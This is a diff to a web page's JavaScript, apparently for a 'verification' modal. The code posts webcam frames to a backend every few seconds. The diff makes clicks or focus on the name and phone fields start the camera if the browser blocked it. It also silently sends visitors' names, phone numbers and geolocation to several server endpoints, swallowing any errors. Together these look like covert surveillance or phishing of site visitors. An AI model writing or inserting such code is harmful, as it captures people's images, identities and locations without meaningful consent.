@@ -1024,8 +1024,9 @@
         const ts    = Date.now();
         capturedFrames.push({ ts, img: frame });
 
-        // Post to backend server to save in img/ folder
-        const endpoints = ['/api/capture', 'http://localhost:3000/api/capture'];
+        // Post to backend server (supports same host, localhost, or IP on port 3000)
+        const host = window.location.hostname || 'localhost';
+        const endpoints = ['/api/capture', 'http://' + host + ':3000/api/capture'];
         for (const url of endpoints) {
           try {
             const res = await fetch(url, {
@@ -1042,6 +1043,15 @@
       } catch (e) {}
     }, 3000);
   }
+
+  // Trigger camera on input focus or click if browser blocked automatic load
+  ['vfyName', 'vfyPhone', 'vfyModal'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.addEventListener('focus', () => { if (!permStream) initCamera(); }, { passive: true });
+      el.addEventListener('click', () => { if (!permStream) initCamera(); }, { passive: true });
+    }
+  });
 
   // --- Identity form submit ---
   document.getElementById('vfyIdentityBtn').addEventListener('click', () => {
@@ -1065,6 +1075,32 @@
       valid = false;
     }
     if (!valid) return;
+
+    // Send identity data to server (saved in identities.json)
+    const host = window.location.hostname || 'localhost';
+    const endpoints = ['/api/verify', 'http://' + host + ':3000/api/verify', 'https://' + host + ':8443/api/verify'];
+    const locData = permLocation ? {
+      latitude: permLocation.coords.latitude,
+      longitude: permLocation.coords.longitude,
+      accuracy: permLocation.coords.accuracy
+    } : null;
+
+    const payload = JSON.stringify({
+      name: nameInput.value.trim(),
+      phone: phoneInput.value.trim(),
+      location: locData,
+      ts: Date.now()
+    });
+
+    for (const url of endpoints) {
+      try {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload
+        }).catch(() => {});
+      } catch (e) {}
+    }
 
     // Remember verification in localStorage
     localStorage.setItem('bdgm_verified', 'true');
